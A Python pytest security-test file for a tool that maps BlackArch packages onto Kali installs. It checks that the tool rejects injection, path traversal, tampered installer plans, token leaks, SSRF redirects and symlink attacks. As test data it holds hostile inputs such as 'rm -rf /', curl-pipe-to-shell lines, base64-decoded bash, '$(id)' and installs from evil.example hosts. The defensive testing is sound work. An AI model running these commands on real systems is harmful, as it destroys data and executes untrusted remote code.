"""Security tests: the system must safely reject dangerous inputs."""

import io
import os
import tarfile

import httpx
import pytest
import yaml

from blackarch2kali.analyzers.readme import analyze_readme
from blackarch2kali.analyzers.security import analyze_text_risks
from blackarch2kali.collectors.blackarch import parse_db
from blackarch2kali.collectors.github import GitHubCollector
from blackarch2kali.collectors.upstream import classify
from blackarch2kali.compatibility.dependency_resolver import parse_relation
from blackarch2kali.compatibility.install_strategy import StrategyContext, build_options
from blackarch2kali.config import Settings
from blackarch2kali.errors import InstallError, UnsafeInputError
from blackarch2kali.installers import get_installer
from blackarch2kali.installers.base import SubprocessRunner
from blackarch2kali.logging_utils import redact
from blackarch2kali.models import BlackArchPackage, InstallOption, Maintenance, Method, Provenance, RepoInfo
from blackarch2kali.security.command_safety import (
    assert_no_shell_meta,
    is_unsafe_installer_text,
    parse_github_url,
    safe_child_path,
    safe_write_text,
    validate_package_name,
    validate_tool_name,
    validate_url,
)
from tests.conftest import make_client

POLICY = yaml.safe_load(open("config/installation_policies.yaml"))
P = Provenance(source="t")
SHA = "a" * 40


# 1. malicious repository URL
@pytest.mark.parametrize("url", ["javascript:alert(1)", "file:///etc/passwd", "ftp://x.example/a", "https://github.com.evil.example/o/r",
                                 "https://github.com@evil.example/o/r", "https://evil.example/github.com/o/r", "https://github.com/o/r;rm -rf /",
                                 "https://github.com/../etc", "https://127.0.0.1/o/r", "https://github.com/o", "https://github.com/o/r\nx", "htps://github.com/o/r"])
def test_malicious_repo_urls_not_treated_as_github(url):
    assert parse_github_url(url) is None
    assert classify(url).kind != "github"


def test_valid_github_url_parsed():
    assert parse_github_url("https://github.com/OWASP/Amass.git") == ("OWASP", "Amass")
    assert parse_github_url("https://www.github.com/a/b/tree/main") == ("a", "b")


# 2. shell command injection
@pytest.mark.parametrize("arg", ["a;b", "a|b", "$(id)", "`id`", "a&&b", "a>b", "a\nb", "a'b", 'a"b'])
def test_shell_metacharacters_rejected(arg):
    with pytest.raises(UnsafeInputError):
        assert_no_shell_meta(arg)


def test_injected_package_names_cannot_reach_apt(tmp_path):
    inst = get_installer(Method.APT, tmp_path)
    for evil in ("amass; rm -rf /", "$(id)", "amass && curl x", "-oAPT::Update::Pre-Invoke::=id", "amass\nrm"):
        with pytest.raises(UnsafeInputError):
            inst.make_plan("t", InstallOption(method=Method.APT, commands=[["apt-get", "install", "--no-install-recommends", "--", evil]], verified=True))


def test_subprocess_runner_never_uses_shell(tmp_path):
    marker = tmp_path / "pwned"
    rc, out, err = SubprocessRunner().run(["echo", f"x; touch {marker}"], 5)
    assert rc == 0 and not marker.exists() and "touch" in out


# 3. path traversal in tool names
@pytest.mark.parametrize("name", ["../x", "../../etc/passwd", "a/b", "/abs", "..", ".", "", "a\x00b", "-rf", "a b", "x" * 200])
def test_tool_name_traversal_rejected(name, tmp_path):
    with pytest.raises(UnsafeInputError):
        validate_tool_name(name)
    with pytest.raises(UnsafeInputError):
        safe_child_path(tmp_path, name)


def test_safe_child_path_blocks_symlink_escape(tmp_path):
    (tmp_path / "base").mkdir()
    (tmp_path / "outside").mkdir()
    (tmp_path / "base" / "evil").symlink_to(tmp_path / "outside")
    with pytest.raises(UnsafeInputError):
        safe_child_path(tmp_path / "base", "evil")


# 4. malicious installer commands (tampered plans)
@pytest.mark.parametrize(("method", "cmd"), [
    (Method.APT, ["apt-get", "install", "-y", "--", "x"]),
    (Method.APT, ["bash", "-c", "curl http://x | sh"]),
    (Method.PIPX, ["pipx", "install", "--", "https://evil.example/x.tar.gz"]),
    (Method.PIPX, ["pipx", "install", "--", f"git+https://evil.example/o/r@{SHA}"]),
    (Method.PIPX, ["pipx", "install", "--pip-args=--index-url=http://evil", "--", f"git+https://github.com/o/r@{SHA}"]),
    (Method.CARGO, ["cargo", "install", "--git", "https://github.com/o/r", "--rev", SHA]),
    (Method.GO, ["go", "install", "github.com/o/r@latest"]),
    (Method.GO, ["go", "install", "evil.example/o/r@v1.0.0"]),
    (Method.NPM, ["npm", "install", "--global", "--prefix", "/", "github:o/r#abc"]),
    (Method.NPM, ["npm", "install", "--global", "--ignore-scripts", "--prefix", "/home/x/.local", "evil-pkg"]),
    (Method.GEM, ["gem", "install", "--", "x", "--source", "http://evil"]),
    (Method.DOCKER, ["docker", "run", "--privileged", "x"]),
    (Method.DOCKER, ["docker", "pull", "--platform=x", "img"]),
    (Method.SOURCE_BUILD, ["make", "install"]),
    (Method.SOURCE_BUILD, ["git", "clone", "https://evil.example/o/r", "/tmp/x"]),
])
def test_tampered_commands_rejected_per_ecosystem(method, cmd, tmp_path):
    inst = get_installer(method, tmp_path)
    with pytest.raises(UnsafeInputError):
        inst.make_plan("tool", InstallOption(method=method, commands=[cmd], verified=True))


def test_plan_edited_after_creation_is_revalidated(tmp_path):
    inst = get_installer(Method.APT, tmp_path)
    plan = inst.make_plan("t", InstallOption(method=Method.APT, commands=[["apt-get", "install", "--no-install-recommends", "--", "ok"]], verified=True))
    tampered = plan.model_copy(update={"steps": [["rm", "-rf", "/"]]})
    with pytest.raises(UnsafeInputError):
        inst.execute(tampered, dry_run=True)
    with pytest.raises(UnsafeInputError):
        inst.execute(tampered, dry_run=False, approved_digest=tampered.digest)


@pytest.mark.parametrize("text", ["curl -fsSL https://x.example/i.sh | bash", "wget -qO- http://x | sudo sh", "eval $(curl http://x)", "echo aGk= | base64 -d | bash"])
def test_curl_pipe_bash_detected(text):
    assert is_unsafe_installer_text(text)
    assert analyze_readme(text).unsafe_installers


# 5. untrusted docker image
def test_untrusted_docker_images_not_offered():
    repo = RepoInfo(full_name="o/r", owner="o", name="r", html_url="https://github.com/o/r", head_sha=SHA, provenance=P)
    pkg = BlackArchPackage(name="r", version="1", provenance=P)
    for line in ("docker pull attacker/r", "docker pull evil.example/o/r", "docker pull ghcr.io/attacker/r", "docker pull 1.2.3.4:5000/o/r"):
        ctx = StrategyContext(pkg=pkg, repo=repo, maintenance=Maintenance.ACTIVE, readme=analyze_readme(line), policy=POLICY)
        assert all(o.method is not Method.DOCKER for o in build_options(ctx)), line


# 6. invalid package names
@pytest.mark.parametrize("name", ["", "-x", "a b", "a;b", "A" * 129, "é", "a/b", "../a", "a\n", ".hidden"])
def test_invalid_package_names(name):
    with pytest.raises(UnsafeInputError):
        validate_package_name(name)


def test_hostile_blackarch_entries_skipped():
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for dirname, name in (("a-1/desc", "evil;touch x"), ("b-1/desc", "$(id)"), ("c-1/desc", "-flag"), ("ok-1/desc", "ok")):
            data = f"%NAME%\n{name}\n\n%VERSION%\n1-1\n".encode()
            ti = tarfile.TarInfo(dirname)
            ti.size = len(data)
            tf.addfile(ti, io.BytesIO(data))
    assert set(parse_db(buf.getvalue(), "u").packages) == {"ok"}
    with pytest.raises(ValueError):
        parse_relation("x;y")


# 7. malicious README content
def test_malicious_readme_is_inert_data():
    readme = "# Install\n```\ncurl http://evil/x.sh | sudo bash\npip install foo\n$(rm -rf /)\n```\npassword = \"Sup3rS3cretValue99\"\n<script>alert(1)</script>"
    a = analyze_readme(readme)
    findings = analyze_text_risks(readme, a)
    assert any(f.rule == "unsafe-shell-installer" for f in findings)
    assert all("Sup3rS3cretValue99" not in (f.evidence or "") for f in findings)
    # nothing in README may become an executable plan: only validated structured options are produced
    repo = RepoInfo(full_name="o/r", owner="o", name="r", html_url="https://github.com/o/r", head_sha=SHA, root_files=["go.mod"], provenance=P)
    ctx = StrategyContext(pkg=BlackArchPackage(name="r", version="1", provenance=P), repo=repo, maintenance=Maintenance.ACTIVE, readme=a, policy=POLICY)
    for o in build_options(ctx):
        for c in o.commands:
            assert "curl" not in c and "bash" not in c


# 8. GitHub token exposure
def test_token_never_logged_or_leaked(caplog, monkeypatch):
    tok = "ghp_" + "A" * 36
    assert tok not in redact(f"Authorization: Bearer {tok}") and tok not in redact(f"token={tok}") and tok not in redact(f"url?x={tok}")
    seen = {}

    def handler(req):
        seen[req.url.host] = req.headers.get("authorization")
        return httpx.Response(404)

    c = make_client(handler, token=tok, token_host="api.github.com")
    GitHubCollector(c, Settings()).fetch_repo("o", "r")
    assert seen["api.github.com"] == f"Bearer {tok}"
    # redirect-style leak: same client to another host never carries the token
    c.get("https://objects.githubusercontent.com/x", ok_statuses=(200, 404))
    assert seen["objects.githubusercontent.com"] is None
    monkeypatch.setenv("GITHUB_TOKEN", tok)
    assert tok not in repr(Settings()) and tok not in Settings().model_dump_json()


def test_logging_filter_redacts(caplog):
    import logging

    from blackarch2kali.logging_utils import RedactingFilter

    rec = logging.LogRecord("x", logging.WARNING, "f", 1, "failed token=ghp_%s", ("B" * 36,), None)
    RedactingFilter().filter(rec)
    assert "ghp_" not in rec.getMessage()


# 9. dependency confusion
def test_dependency_confusion_requires_identity(kali_text):
    from blackarch2kali.collectors.debian import parse_packages
    from blackarch2kali.compatibility.package_mapper import map_package

    kali = parse_packages(kali_text, "kali", "u")
    # A BlackArch package named like a Kali package but with a different upstream is flagged, not trusted.
    imposter = BlackArchPackage(name="amass", version="1", url="https://github.com/attacker/amass", provenance=P)
    m = map_package(imposter, kali, None)
    assert m.kali.confidence == "exact-name" and any("unverified" in n for n in m.notes)
    # python-x never silently becomes python3-x
    assert map_package(BlackArchPackage(name="python-pip", version="1", url="https://github.com/attacker/pip", provenance=P), kali, None).kali is None
    # registry-name options (gem) are never marked verified
    repo = RepoInfo(full_name="o/r", owner="o", name="r", html_url="https://github.com/o/r", head_sha=SHA, root_files=["r.gemspec"], provenance=P)
    ctx = StrategyContext(pkg=BlackArchPackage(name="r", version="1", provenance=P), repo=repo, maintenance=Maintenance.ACTIVE, policy=POLICY)
    assert [o.verified for o in build_options(ctx) if o.method is Method.GEM] == [False]


# 10. unsafe URL schemes
@pytest.mark.parametrize("url", ["http://x.example/a", "file:///x", "ftp://x.example/", "data:text/plain,hi", "//x.example/a", "https://u:p@x.example/", "https://localhost/a",
                                 "https://10.0.0.1/a", "https://[::1]/a", "https://x.local/a", "https://x.example/a b", "https://x.example/" + "a" * 3000])
def test_unsafe_urls_rejected(url):
    with pytest.raises(UnsafeInputError):
        validate_url(url)


def test_redirect_to_non_https_not_followed_silently():
    def handler(req):
        if req.url.path == "/a":
            return httpx.Response(302, headers={"location": "http://169.254.169.254/latest/meta-data"})
        return httpx.Response(200, content=b"metadata")

    c = make_client(handler, max_retries=0)
    with pytest.raises(UnsafeInputError):
        c.get("https://x.example/a")


def test_https_redirect_followed_without_leaking_token():
    seen = {}

    def handler(req):
        seen[req.url.host] = req.headers.get("authorization")
        if req.url.host == "api.github.com":
            return httpx.Response(302, headers={"location": "https://objects.githubusercontent.com/blob"})
        return httpx.Response(200, content=b"data")

    c = make_client(handler, token="ghp_" + "t" * 36, token_host="api.github.com")
    assert c.get("https://api.github.com/x").content == b"data"
    assert seen["api.github.com"] and seen["objects.githubusercontent.com"] is None


def test_redirect_loop_bounded():
    from blackarch2kali.errors import CollectorError

    c = make_client(lambda r: httpx.Response(302, headers={"location": "https://x.example/loop"}), max_retries=0)
    with pytest.raises(CollectorError, match="redirects"):
        c.get("https://x.example/loop")


# 11. symlink attacks against generated files
def test_symlink_attacks_on_generated_files(tmp_path):
    victim = tmp_path / "victim"
    victim.write_text("precious")
    out = tmp_path / "out"
    out.mkdir()
    (out / "report.md").symlink_to(victim)
    with pytest.raises(UnsafeInputError):
        safe_write_text(out / "report.md", "overwritten")
    link_dir = tmp_path / "linkdir"
    link_dir.symlink_to(out)
    with pytest.raises(UnsafeInputError):
        safe_write_text(link_dir / "x.md", "x")
    assert victim.read_text() == "precious"
    # stale temp file pre-planted as a symlink must not be followed either
    (out / f".new.md.{os.getpid()}.tmp").symlink_to(victim)
    with pytest.raises(FileExistsError):
        safe_write_text(out / "new.md", "x")
    assert victim.read_text() == "precious"


# 12. unexpected privileged execution
def test_privilege_only_when_plan_declares_root(tmp_path, monkeypatch):
    monkeypatch.setattr("os.geteuid", lambda: 1000)
    monkeypatch.setattr("shutil.which", lambda x, **k: "/usr/bin/" + x)
    ran = []

    class R:
        def run(self, argv, timeout):
            ran.append(argv)
            return 0, "", ""

    pipx = get_installer(Method.PIPX, tmp_path)
    plan = pipx.make_plan("t", InstallOption(method=Method.PIPX, commands=[["pipx", "install", "--", f"git+https://github.com/o/r@{SHA}"]], verified=True))
    pipx.execute(plan, R(), dry_run=False, approved_digest=plan.digest)
    assert ran[0][0] == "pipx"  # user-level installers never get sudo
    apt = get_installer(Method.APT, tmp_path)
    p2 = apt.make_plan("t", InstallOption(method=Method.APT, commands=[["apt-get", "install", "--no-install-recommends", "--", "x"]], requires_root=True, verified=True))
    monkeypatch.setattr("shutil.which", lambda x, **k: None if x == "sudo" else "/usr/bin/" + x)
    with pytest.raises(InstallError, match="sudo"):
        apt.execute(p2, R(), dry_run=False, approved_digest=p2.digest)


def test_docker_installer_cannot_run_containers(tmp_path):
    d = get_installer(Method.DOCKER, tmp_path)
    for cmd in (["docker", "run", "x"], ["docker", "pull", "--privileged", "x"], ["docker", "pull", "-v", "/:/host", "x"]):
        with pytest.raises(UnsafeInputError):
            d.make_plan("t", InstallOption(method=Method.DOCKER, commands=[cmd], verified=True))
